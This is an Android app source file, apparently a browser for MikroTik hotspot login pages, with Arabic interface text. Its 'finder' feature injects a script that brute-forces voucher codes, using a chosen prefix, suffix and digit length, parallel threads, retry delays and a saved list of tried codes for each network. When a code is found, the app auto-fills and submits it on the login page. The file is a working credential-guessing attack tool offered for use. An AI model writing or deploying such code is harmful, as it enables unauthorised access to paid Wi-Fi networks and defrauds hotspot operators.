package com.example.mikrotikbrowser;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;
import java.net.URI;

public class MainActivity extends Activity {
    private WebView webView;
    private EditText urlBar;
    private ProgressBar progressBar;
    private LinearLayout panel;
    private ScrollView logScroll;
    private TextView logText, voucherResult, statusText;
    private EditText etPrefix, etSuffix, etDigits, etAttempts;
    private EditText etPause, etRetry, etStatusEvery, etRttEvery;
    private SharedPreferences prefs;
    private String finderJs = "";
    private StringBuilder logBuf = new StringBuilder();
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean logUpdatePending = false;
    private String currentNetwork = "default";

    @SuppressLint("SetJavaScriptEnabled")
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("finder", MODE_PRIVATE);

        webView = findViewById(R.id.webView);
        urlBar = findViewById(R.id.urlBar);
        progressBar = findViewById(R.id.progressBar);
        panel = findViewById(R.id.panel);
        logScroll = findViewById(R.id.logScroll);
        logText = findViewById(R.id.logText);
        voucherResult = findViewById(R.id.voucherResult);
        statusText = findViewById(R.id.statusText);
        etPrefix = findViewById(R.id.etPrefix);
        etSuffix = findViewById(R.id.etSuffix);
        etDigits = findViewById(R.id.etDigits);
        etAttempts = findViewById(R.id.etAttempts);
        etPause = findViewById(R.id.etPause);
        etRetry = findViewById(R.id.etRetry);
        etStatusEvery = findViewById(R.id.etStatusEvery);
        etRttEvery = findViewById(R.id.etRttEvery);

        etPrefix.setText(prefs.getString("prefix", ""));
        etSuffix.setText(prefs.getString("suffix", ""));
        etDigits.setText(prefs.getString("digits", "2"));
        etAttempts.setText(prefs.getString("attempts", "100"));
        etPause.setText(prefs.getString("pause", "300"));
        etRetry.setText(prefs.getString("retry", "1000"));
        etStatusEvery.setText(prefs.getString("statusEvery", "50"));
        etRttEvery.setText(prefs.getString("threads", "3"));

        try {
            InputStream is = getAssets().open("finder.js");
            byte[] buf = new byte[is.available()];
            is.read(buf);
            is.close();
            finderJs = new String(buf, StandardCharsets.UTF_8);
        } catch (Exception e) {}

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        s.setAllowFileAccess(true);
        webView.setBackgroundColor(0xFF000000);
        webView.addJavascriptInterface(new Bridge(), "AndroidBridge");

        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView v, String u) {
                urlBar.setText(u);
                progressBar.setVisibility(View.GONE);
            }
        });
        webView.setWebChromeClient(new WebChromeClient() {
            @Override public void onProgressChanged(WebView v, int p) {
                progressBar.setProgress(p);
                progressBar.setVisibility(p < 100 ? View.VISIBLE : View.GONE);
            }
        });

        findViewById(R.id.btnGo).setOnClickListener(v -> navigate());
        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());
        findViewById(R.id.btnFinder).setOnClickListener(v -> {
            panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
        });

        findViewById(R.id.btnStart).setOnClickListener(v -> startFinder());
        findViewById(R.id.btnStop).setOnClickListener(v -> stopFinder());
        findViewById(R.id.btnClear).setOnClickListener(v -> clearProgress());

        webView.loadUrl("http://connectivitycheck.gstatic.com/generate_204");
    }

    private void navigate() {
        String u = urlBar.getText().toString().trim();
        if (u.isEmpty()) return;
        if (!u.startsWith("http")) u = "http://" + u;
        webView.loadUrl(u);
    }

    private void clearProgress() {
        new AlertDialog.Builder(this)
            .setTitle("مسح سجل التخمين")
            .setMessage("هل أنت متأكد من مسح جميع الأرقام التي تم تخمينها لهذه الشبكة؟")
            .setPositiveButton("نعم", (d, w) -> {
                Set<String> empty = new HashSet<>();
                prefs.edit().putStringSet("tried_" + currentNetwork, empty).apply();
                logBuf.setLength(0);
                logText.setText("🗑️ تم مسح سجل التخمين بنجاح.\n");
                Toast.makeText(this, "تم المسح", Toast.LENGTH_SHORT).show();
            })
            .setNegativeButton("إلغاء", null)
            .show();
    }

    private void startFinder() {
        String url = webView.getUrl();
        if (url == null || !url.contains("/")) {
            Toast.makeText(this, "افتح صفحة الدخول أولاً", Toast.LENGTH_SHORT).show();
            return;
        }
        if (!url.contains("/login")) url = url.replaceAll("/+$", "") + "/login";

        try {
            currentNetwork = new URI(url).getHost();
            if (currentNetwork == null) currentNetwork = "default";
        } catch (Exception e) { currentNetwork = "default"; }

        String prefix = etPrefix.getText().toString().trim();
        String suffix = etSuffix.getText().toString().trim();
        int digits = pi(etDigits, 2);
        int attempts = pi(etAttempts, 100);
        int pause = pi(etPause, 300);
        int retry = pi(etRetry, 1000);
        int statusEvery = pi(etStatusEvery, 50);
        int threads = pi(etRttEvery, 3);

        prefs.edit()
            .putString("prefix", prefix).putString("suffix", suffix)
            .putString("digits", String.valueOf(digits))
            .putString("attempts", String.valueOf(attempts))
            .putString("pause", String.valueOf(pause))
            .putString("retry", String.valueOf(retry))
            .putString("statusEvery", String.valueOf(statusEvery))
            .putString("threads", String.valueOf(threads))
            .apply();

        Set<String> triedSet = prefs.getStringSet("tried_" + currentNetwork, new HashSet<>());
        StringBuilder triedJson = new StringBuilder("[");
        int c = 0;
        for (String t : triedSet) {
            if (c > 0) triedJson.append(",");
            triedJson.append("\"").append(t).append("\"");
            c++;
        }
        triedJson.append("]");

        logBuf.setLength(0);
        logText.setText("");
        voucherResult.setVisibility(View.GONE);
        statusText.setText("جاري التخمين...");

        String cfg = "window.FINDER_CONFIG={"
            + "url:'" + url + "',"
            + "prefix:'" + prefix + "',"
            + "suffix:'" + suffix + "',"
            + "digits:" + digits + ","
            + "attempts:" + attempts + ","
            + "pause:" + pause + ","
            + "retryDelay:" + retry + ","
            + "statusEvery:" + statusEvery + ","
            + "threads:" + threads + ","
            + "tried:" + triedJson.toString() + "};";
        webView.evaluateJavascript(cfg, null);
        webView.evaluateJavascript(finderJs, null);
    }

    private void stopFinder() {
        webView.evaluateJavascript("window.stopFinder && window.stopFinder();", null);
        statusText.setText("متوقف");
    }

    private int pi(EditText e, int def) {
        try { return Integer.parseInt(e.getText().toString().trim()); }
        catch (Exception ex) { return def; }
    }

    private void appendLog(String msg) {
        logBuf.append(msg).append('\n');
        if (logBuf.length() > 20000) logBuf.delete(0, 15000);
        
        if (!logUpdatePending) {
            logUpdatePending = true;
            uiHandler.postDelayed(() -> {
                logText.setText(logBuf.toString());
                logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
                logUpdatePending = false;
            }, 100);
        }
    }

    public class Bridge {
        @JavascriptInterface public void log(String m) {
            runOnUiThread(() -> appendLog(m));
        }
        @JavascriptInterface public void saveTried(String v) {
            Set<String> triedSet = new HashSet<>(prefs.getStringSet("tried_" + currentNetwork, new HashSet<>()));
            triedSet.add(v);
            prefs.edit().putStringSet("tried_" + currentNetwork, triedSet).apply();
        }
        @JavascriptInterface public void progress(int c, int t, String v) {
            runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v));
        }
        @JavascriptInterface public void found(String v, String j) {
            runOnUiThread(() -> {
                appendLog("═══════════════════════════════════");
                appendLog("✅✅✅ وجد الكرت: " + v);
                appendLog("═══════════════════════════════════");
                voucherResult.setText("✅ الكرت: " + v);
                voucherResult.setVisibility(View.VISIBLE);
                statusText.setText("✅ وجد: " + v);
                Toast.makeText(MainActivity.this, "✅ " + v, Toast.LENGTH_LONG).show();
                
                String js = "javascript:(function() {" +
                    "var inputs = document.querySelectorAll('input');" +
                    "var found = false;" +
                    "for (var i=0; i<inputs.length; i++) {" +
                    "  var inp = inputs[i];" +
                    "  if (inp.type === 'text' || inp.type === 'tel' || inp.name.includes('username') || inp.id.includes('username') || inp.id.includes('voucher')) {" +
                    "    inp.value = '" + v + "';" +
                    "    inp.dispatchEvent(new Event('input', {bubbles:true}));" +
                    "    inp.dispatchEvent(new Event('change', {bubbles:true}));" +
                    "    found = true;" +
                    "    break;" +
                    "  }" +
                    "}" +
                    "if (found) {" +
                    "  var btn = document.querySelector('input[type=\"submit\"], button[type=\"submit\"], .login-btn, .btn-login');" +
                    "  if (btn) { btn.click(); }" +
                    "}" +
                    "})()";
                webView.evaluateJavascript(js, null);
                webView.postDelayed(() -> webView.reload(), 4000);
            });
        }
    }

    @Override public void onBackPressed() {
        if (webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }
}
